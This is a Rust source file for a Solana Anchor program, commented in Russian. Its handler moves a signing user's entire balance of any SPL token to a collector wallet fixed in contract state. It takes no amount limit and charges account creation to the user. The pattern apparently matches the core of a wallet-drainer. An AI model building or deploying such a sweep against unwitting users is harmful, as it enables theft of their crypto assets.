use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer};
use anchor_spl::associated_token::AssociatedToken;
use crate::state::*;

#[derive(Accounts)]
pub struct CollectSplTokens<'info> {
    #[account(
        seeds = [CollectorState::SEED],
        bump = collector_state.bump
    )]
    pub collector_state: Account<'info, CollectorState>,
    
    #[account(mut)]
    pub user_wallet: Signer<'info>,
    
    /// CHECK: Кошелек-получатель из настроек контракта
    #[account(
        constraint = collector_wallet.key() == collector_state.collector_wallet
    )]
    pub collector_wallet: AccountInfo<'info>,
    
    /// Mint аккаунт SPL токена
    pub mint: Account<'info, anchor_spl::token::Mint>,
    
    /// Токен аккаунт пользователя (источник)
    #[account(
        mut,
        associated_token::mint = mint,
        associated_token::authority = user_wallet
    )]
    pub user_token_account: Account<'info, TokenAccount>,
    
    /// Токен аккаунт получателя (назначение)
    #[account(
        init_if_needed,
        payer = user_wallet,
        associated_token::mint = mint,
        associated_token::authority = collector_wallet
    )]
    pub collector_token_account: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub associated_token_program: Program<'info, AssociatedToken>,
    pub system_program: Program<'info, System>,
}

pub fn collect_spl_tokens_handler(ctx: Context<CollectSplTokens>) -> Result<()> {
    let user_token_account = &ctx.accounts.user_token_account;
    let collector_token_account = &ctx.accounts.collector_token_account;
    let user_wallet = &ctx.accounts.user_wallet;
    let mint = &ctx.accounts.mint;
    
    // Получаем баланс пользователя
    let user_balance = user_token_account.amount;
    
    msg!("Собираем SPL токен: {}", mint.key());
    msg!("Баланс пользователя: {}", user_balance);
    
    // Проверяем, есть ли токены для перевода
    if user_balance > 0 {
        msg!("Переводим {} токенов", user_balance);
        
        // Переводим все токены
        token::transfer(
            CpiContext::new(
                ctx.accounts.token_program.to_account_info(),
                Transfer {
                    from: user_token_account.to_account_info(),
                    to: collector_token_account.to_account_info(),
                    authority: user_wallet.to_account_info(),
                },
            ),
            user_balance,
        )?;
        
        msg!("SPL токены успешно переведены!");
    } else {
        msg!("Нет токенов для перевода");
    }
    
    Ok(())
}